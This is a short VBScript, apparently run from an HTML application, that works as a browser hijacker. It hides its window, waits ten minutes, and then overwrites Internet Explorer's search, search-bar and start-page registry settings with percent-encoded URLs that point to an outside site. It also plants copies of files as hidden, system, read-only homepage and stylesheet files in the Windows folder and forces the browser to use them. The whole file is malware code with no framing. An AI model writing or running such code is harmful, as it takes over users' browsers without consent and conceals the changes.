On Error Resume Next
self.MoveTo 10000,10000
Set Shl = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
wd = fso.GetSpecialFolder(0)
Sub DoIt()
	One()
	Two()
	Thr()
	self.close()
End Sub
Sub One()
	Shl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Search_URL","http://%31%2D%73%65%2E%63%6F%6D/%68%6F%6D%65%2E%68%74%6D%6C"
	Shl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\SearchAssistant","http://%31%2D%73%65%2E%63%6F%6D/%73%72%63%68%61%73%73%74%2E%68%74%6D%6C"
	Shl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Search Bar","http://%31%2D%73%65%2E%63%6F%6D/%73%72%63%68%61%73%73%74%2E%68%74%6D%6C"
	Shl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page","http://%31%2D%73%65%2E%63%6F%6D/%68%6F%6D%65%2E%68%74%6D%6C"
	Shl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Search\","http://%31%2D%73%65%2E%63%6F%6D/%73%72%63%68%61%73%73%74%2E%68%74%6D%6C"
	Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page","http://%31%2D%73%65%2E%63%6F%6D/%68%6F%6D%65%2E%68%74%6D%6C"
	Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Search_URL","http://%31%2D%73%65%2E%63%6F%6D/%68%6F%6D%65%2E%68%74%6D%6C"
	Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\SearchAssistant","http://%31%2D%73%65%2E%63%6F%6D/%73%72%63%68%61%73%73%74%2E%68%74%6D%6C"
	Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Search Bar","http://%31%2D%73%65%2E%63%6F%6D/%73%72%63%68%61%73%73%74%2E%68%74%6D%6C"
	Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Search\","http://%31%2D%73%65%2E%63%6F%6D/%73%72%63%68%61%73%73%74%2E%68%74%6D%6C"
	Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\SearchURL\","http://%31%2D%73%65%2E%63%6F%6D/%68%6F%6D%65%2E%68%74%6D%6C"
End Sub
Sub Two()
	stp = Shl.RegRead("HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\SP Uninstall")
	If stp Then
		d1 = wd + "\homepage.htm"
		If NOT fso.FileExists(d1) Then
			d2 = wd + "\odbs.log"
			Set f1 = fso.GetFile(d2)
			f1.Copy d1
			Set f2 = fso.GetFile(d1)
			f2.Attributes = 7
		End If
		Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", wd + "\homepage.htm"
		Shl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Page_URL", wd + "\homepage.htm"
	End If
End Sub
Sub Thr()
	d3 = wd + "\color.css"
	If NOT fso.FileExists(d3) Then
		d4 = wd + "\system.sam"
		Set f3 = fso.GetFile(d4)
		f3.Copy d3
		Set f4 = fso.GetFile(d3)
		f4.Attributes = 7
	End If
	css = Shl.RegRead("HKCU\SOFTWARE\Microsoft\Internet Explorer\Styles\Use My Stylesheet")
	If css Then
		Shl.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Styles\User Stylesheet", wd + "\color.css"
	End If
End Sub
setTimeout "DoIt()", 600000


''#
